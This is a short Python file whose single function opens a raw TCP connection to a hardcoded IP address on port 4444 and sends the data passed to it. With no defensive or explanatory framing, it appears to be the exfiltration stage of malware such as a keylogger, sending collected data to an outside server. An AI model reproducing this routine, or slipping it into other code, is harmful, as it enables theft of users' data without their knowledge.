import socket

def ConnectToServerSend(data):
    if data:
        _host = "45.79.202.234"
        _port = 4444
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((_host, _port))
        sock.sendall(data.encode('utf-8'))





